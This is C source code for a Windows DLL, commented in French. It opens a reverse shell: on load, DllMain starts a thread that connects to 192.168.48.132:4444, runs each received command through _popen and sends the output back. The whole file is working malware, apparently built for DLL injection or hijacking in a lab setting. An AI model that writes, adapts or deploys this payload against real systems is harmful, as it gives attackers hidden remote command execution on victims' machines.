#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
// UTF16("str") == L"str" # Wide Character String / UTF-16
#define _UTF16(x)   L##x
#define UTF16(x)    _UTF16(x)

// Function to get the length of a string
size_t strlen(const char* str) {
    const char* s = str;
    while (*s) {
        s++;
    }
    return s - str;
}

__declspec(dllexport) void ReverseShell_TCP(LPVOID param) {
    // Initialiser la bibliothèque WinSock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    const char* ip = "192.168.48.132";  // IP du serveur
    int port = 4444;  // Le port du serveur

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip);

    // Connexion au serveur
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Boucle pour recevoir des commandes et envoyer la sortie
    char buffer[1024];
    DWORD bytesRead;
    while (1) {
        // Réception de la commande du serveur
        int recvResult = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (recvResult == SOCKET_ERROR || recvResult == 0) {
            break;  // Si une erreur survient ou la connexion est fermée, quitter la boucle
        }

        // Ajouter un caractère de fin de chaîne
        buffer[recvResult] = '\0';

        // Exécuter la commande reçue
        FILE* pipe = _popen(buffer, "r");
        if (pipe == NULL) {
            // En cas d'erreur lors de l'exécution de la commande, envoyer une erreur au serveur
            const char* errorMsg = "Erreur lors de l'exécution de la commande.\n";
            send(sock, errorMsg, strlen(errorMsg), 0);
        } else {
            // Lire la sortie de la commande et l'envoyer au serveur
            while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
                send(sock, buffer, strlen(buffer), 0);
            }
            fclose(pipe);
        }
    }

    // Fermer la socket et nettoyer les ressources
    closesocket(sock);
    WSACleanup();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL; (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_ATTACH)
        CreateThread(0, 0, (void*)ReverseShell_TCP, 0, 0, 0);
    return TRUE;
}

